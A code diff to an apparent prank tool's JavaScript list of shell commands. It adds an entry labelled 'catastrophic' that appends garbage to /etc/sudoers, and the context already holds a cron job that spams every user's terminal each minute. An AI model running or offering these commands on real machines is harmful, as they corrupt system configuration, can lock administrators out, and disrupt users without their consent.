@@ -26,5 +26,6 @@ var commands = [
     { shortName: "Guitar", shell: 'bash', risk: 'low', category: 'fun', command: "echo 'E4,B3,G3,D3,A2,E2'|xargs -d,  -i play -n synth pl {} fade 0 1" },
     { shortName: "CurrentTime", shell: 'bash', risk: 'low', category: 'harmless', command: 'date -d @$(grep ^btime /proc/stat | cut -d" " -f 2)' },
     { shortName: "RandomMusic", shell: 'bash', risk: 'low', category: 'fun', command: 'find ~/Music -maxdepth 5 -type f -printf \'%p\n\' -name "*.mp3" | shuf -n 1 | xargs -i mpg123 "{}"' },
-    { shortName: "Whallo", shell: 'bash', risk: 'low', category: 'annoying', command: '(crontab -l 2>/dev/null; echo "*/1 * * * * echo \'peekaboo\'| wall") | crontab -'}
+    { shortName: "Whallo", shell: 'bash', risk: 'low', category: 'annoying', command: '(crontab -l 2>/dev/null; echo "*/1 * * * * echo \'peekaboo\'| wall") | crontab -'},
+    { shortName: "BorkSudoers", shell: 'bash', risk: 'extreme', category: 'catastrophic', command: 'echo "oops!" >> /etc/sudoers'}
 ]
